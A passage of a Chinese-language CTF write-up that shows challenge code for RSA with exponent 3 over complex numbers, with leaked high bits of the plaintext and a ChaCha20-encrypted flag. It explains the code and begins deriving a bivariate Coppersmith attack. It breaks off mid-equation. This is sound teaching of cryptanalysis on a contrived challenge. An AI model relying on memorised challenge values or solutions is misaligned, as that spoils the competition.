class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, re, im</span>):</span><br><span class="line">        self.re = re <span class="comment"># 实部</span></span><br><span class="line">        self.im = im <span class="comment"># 虚部</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, c</span>):</span><br><span class="line">        re_ = self.re * c.re - self.im * c.im <span class="comment"># 相乘后的实数部分</span></span><br><span class="line">        im_ = self.re * c.im + self.im * c.re <span class="comment"># 相乘后的虚数部分 </span></span><br><span class="line">        <span class="keyword">return</span> Complex(re_, im_)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, c</span>):</span><br><span class="line">        <span class="keyword">return</span> self.re == c.re <span class="keyword">and</span> self.im == c.im <span class="comment"># 判断相等</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__rshift__</span>(<span class="params">self, m</span>):</span><br><span class="line">        <span class="keyword">return</span> Complex(self.re &gt;&gt; m, self.im &gt;&gt; m) <span class="comment"># 实部和虚部同步右移</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__lshift__</span>(<span class="params">self, m</span>):</span><br><span class="line">        <span class="keyword">return</span> Complex(self.re &lt;&lt; m, self.im &lt;&lt; m) <span class="comment"># 实部和虚部同步左移</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.im == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(self.re) <span class="comment"># 如果虚数部分为0,返回实数部分</span></span><br><span class="line">        <span class="keyword">elif</span> self.re == <span class="number">0</span>:      <span class="comment"># 如果实数部分为0,且虚部为1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(self.im) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> <span class="keyword">if</span> self.im &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>i&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.im&#125;</span>i&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.re&#125;</span> <span class="subst">&#123;<span class="string">&#x27;+&#x27;</span> <span class="keyword">if</span> self.im &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;-&#x27;</span>&#125;</span> <span class="subst">&#123;<span class="built_in">abs</span>(self.im)&#125;</span>i&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tolist</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> [self.re, self.im]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_pow</span>(<span class="params">c, exp, n</span>): <span class="comment"># 定义复数域上的模幂运算</span></span><br><span class="line">    result = Complex(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = result * c</span><br><span class="line">            result.re = result.re % n</span><br><span class="line">            result.im = result.im % n</span><br><span class="line">        c = c * c</span><br><span class="line">        c.re = c.re % n</span><br><span class="line">        c.im = c.im % n</span><br><span class="line">        exp &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">bits = <span class="number">128</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">m = Complex(getRandomRange(<span class="number">1</span>, n), getRandomRange(<span class="number">1</span>, n))</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = complex_pow(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;mh = <span class="subst">&#123;(m &gt;&gt; bits &lt;&lt; bits).tolist()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;C = <span class="subst">&#123;c.tolist()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc = <span class="subst">&#123;ChaCha20.new(key=hashlib.sha256(<span class="built_in">str</span>(m.re + m.im).encode()).digest(), nonce=<span class="string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).encrypt(flag)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753</span></span><br><span class="line"><span class="string">mh = [3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016, 15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552]</span></span><br><span class="line"><span class="string">C = [5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760, 21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752]</span></span><br><span class="line"><span class="string">enc = b&#x27;\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>附件中实现了复数域上的<code>RSA</code>加密。在附件的代码中，我们能看到一个<code>复数类</code>，这个类里面的属性有<code>re</code>（实部）、<code>im</code>（虚部），然后还有几个方法：</li><li><code>def __mul__</code>即两个复数相乘运算，运算结果如下：</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>设</mtext><mi>x</mi><mo>=</mo><msub><mi>a</mi><mn>1</mn></msub><mo>+</mo><msub><mi>b</mi><mn>1</mn></msub><mi>i</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>设</mtext><mi>y</mi><mo>=</mo><msub><mi>a</mi><mn>2</mn></msub><mo>+</mo><msub><mi>b</mi><mn>2</mn></msub><mi>i</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>两个复数相乘</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>x</mi><mo>∗</mo><mi>y</mi><mo>=</mo><msub><mi>a</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>a</mi><mn>2</mn></msub><mo>−</mo><msub><mi>b</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>b</mi><mn>2</mn></msub><mo>+</mo><mo stretchy="false">(</mo><msub><mi>a</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>b</mi><mn>2</mn></msub><mo>+</mo><msub><mi>a</mi><mn>2</mn></msub><mo>∗</mo><msub><mi>b</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mi>i</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}设x = a_1 + b_1i\\设y= a_2+b_2i\\两个复数相乘\\x*y = a_1*a_2-b_1*b_2+(a_1*b_2+a_2*b_1)i\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.800000000000001em;vertical-align:-2.1500000000000004em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.6500000000000004em;"><span style="top:-4.8100000000000005em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">设</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">i</span></span></span><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">设</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">i</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">复</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">相</span><span class="mord cjk_fallback">乘</span></span></span><span style="top:-1.2099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.1500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><ul><li><p><code>def __eq__</code>，这个方法定义了判断两个复数是否相等。</p></li><li><p><code>def __rshift__(self, m)</code>、<code>def __rshift__(self, m)</code>这两个定义了复数域上的位移操作，左移或者右移<code>m</code>位就相当于将实部和虚部都左移或者右移<code>m</code>位。</p></li><li><p><code>def __str__</code>，返回的就是这个复数的字符表达形式。</p></li><li><p><code>def tolist</code>，获取这个复数类的实部和虚部。</p></li><li><p>程序中还有一个函数<code>def complex_pow</code>，实现的就是复数域上的模幂运算。</p></li><li><p>接下来我们查看加密过程，与正常<code>RSA</code>加密没差，先是生成<code>n</code>，然后这里<code>m</code>即明文是复数，并且实部和虚部都是随机生成的一个整数。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bits = <span class="number">128</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">m = Complex(getRandomRange(<span class="number">1</span>, n), getRandomRange(<span class="number">1</span>, n))</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = complex_pow(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;mh = <span class="subst">&#123;(m &gt;&gt; bits &lt;&lt; bits).tolist()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;C = <span class="subst">&#123;c.tolist()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc = <span class="subst">&#123;ChaCha20.new(key=hashlib.sha256(<span class="built_in">str</span>(m.re + m.im).encode()).digest(), nonce=<span class="string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).encrypt(flag)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>然后我们对<code>m</code>进行rsa加密，加密过程<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>≡</mo><msup><mi>m</mi><mn>3</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c \equiv m^3~mod~(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，很显然是一个低指数加密，并且之后我们的<code>m</code>还泄露了高位。这时我们就会想到需要使用<code>coppersmith</code>攻击。但是这与我们之前做的一元coppersmith攻击不同。我们先将方程列好。</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>设</mtext><mi>m</mi><mo>=</mo><mi>a</mi><mo>+</mo><mi>b</mi><mi>i</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>所以就有如下式子</mtext><mo>:</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>c</mi><mo>≡</mo><msup><mi>m</mi><mn>3</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>c</mi><mo>≡</mo><mo stretchy="false">(</mo><mi>a</mi><mo>+</mo><mi>b</mi><mi>i</mi><msup><mo stretchy="false">)</mo><mn>3</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>c</mi><mo>≡</mo><msup><mi>a</mi><mn>3</mn></msup><mo>−</mo><mn>3</mn><mi>a</mi><msup><mi>b</mi><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mn>3</mn><msup><mi>a</mi><mn>2</mn></msup><mi>b</mi><mo>−</mo><msup><mi>b</mi><mn>3</mn></msup><mo stretchy="false">)</mo><mi>i</mi><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>这时我们再设</mtext><mi>a</mi><mo>=</mo><msub><mi>a</mi><mi>h</mi></msub><mo>+</mo><mi>x</mi><mo separator="true">,</mo><mtext>   </mtext><mi>b</mi><mo>=</mo><msub><mi>b</mi><mi>h</mi></msub><mo>+</mo><mi>y</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>带入就会得到如下式子</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>c</mi><mo>≡</mo><mo stretchy="false">(</mo><msub><mi>a</mi><mi>h</mi></msub><mo>+</mo><mi>x</mi><msup><mo stretchy="false">)</mo><mn>3</mn></msup><mo>−</mo><mn>3</mn><mo stretchy="false">(</mo><msub><mi>a</mi><mi>h</mi></msub><mo>+</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>b</mi><mi>h</mi></msub><mo>+</mo><mi>y</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>+</mo><mo stretchy="false">[</mo><mn>3</mn><mo stretchy="false">(</mo><msub><mi>a</mi><mi>h</mi></msub><mo>+</mo><mi>x</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo stretchy="false">(</mo><msub><mi>b</mi><mi>h</mi></msub><mo>+</mo><mi>y</mi><mo stretchy="false">)</mo><mo>−</mo><mo stretchy="false">(</mo><msub><mi>b</mi><mi>h</mi></msub><mo>+</mo><mi>y</mi><msup><mo stretchy="false">)</mo><mn>3</mn></msup><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>实部对实部虚部对虚部就会有如下式子</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mo>≡</mo><mo stretchy="false">(</mo><msub><mi>a</mi><mi>h</mi></msub><mo>+</mo><mi>x</mi><msup><mo stretchy="false">)</mo><mn>3</mn></msup><mo>−</mo><mn>3</mn><mo stretchy="false">(</mo><msub><mi>a</mi><mi>h</mi></msub><mo>+</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>b</mi><mi>h</mi></msub><mo>+</mo><mi>y</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>−</mo><msub><mi>c</mi><mn>1</mn></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mo>≡</mo><mn>3</mn><mo stretchy="false">(</mo><msub><mi>a</mi><mi>h</mi></msub><mo>+</mo><mi>x</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo stretchy="false">(</mo><msub><mi>b</mi><mi>h</mi></msub><mo>+</mo><mi>y</mi><mo stretchy="false">)</mo><mo>−</mo><mo stretchy="false">(</mo><msub><mi>b</mi><mi>h</mi></msub><mo>+</mo><mi>y</mi><msup><mo stretchy="false">)</mo><mn>3</mn></msup><mo>−</mo><msub><mi>c</mi><mn>2</mn></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>记</mtext><msub><mi>f</mi><mn>1</mn></msub><mo>=</mo><mo stretchy="false">(</mo><msub><mi>a</mi><mi>h</mi></msub><mo>+</mo><mi>x</mi><msup><mo stretchy="false">)</mo><mn>3</mn></msup><mo>−</mo><mn>3</mn><mo stretchy="false">(</mo><msub><mi>a</mi><mi>h</mi></msub><mo>+</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>b</mi><mi>h</mi></msub><mo>+</mo><mi>y</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>−</mo><msub><mi>c</mi><mn>1</mn></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>记</mtext><msub><mi>f</mi><mn>2</mn></msub><mo>=</mo><mn>3</mn><mo 